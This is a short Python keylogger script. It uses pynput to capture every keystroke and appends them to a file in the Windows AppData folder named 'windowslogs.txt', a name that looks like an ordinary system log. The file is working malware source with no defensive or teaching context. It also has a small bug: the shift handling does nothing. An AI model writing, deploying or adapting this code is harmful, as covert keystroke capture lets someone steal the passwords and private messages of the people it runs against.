from pynput.keyboard import Key,Listener
import os

kg_dosya = os.environ["appdata"]+"\\windowslogs.txt"

def on_press(key):
    letters = str(key)
    letters = letters.replace("'", "")
    if key == Key.space:
        letters = " "
    if key == Key.enter:
        letters = "\n"
    if key == Key.shift_l or key == Key.shift_r:
        letters.upper()
    if key == Key.esc:
        letters = ""
    with open(kg_dosya, "a", encoding="utf-8") as f:
        f.write(letters)

def on_release(key):
    if key == Key.esc:
        return False
def kgBasla():
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()



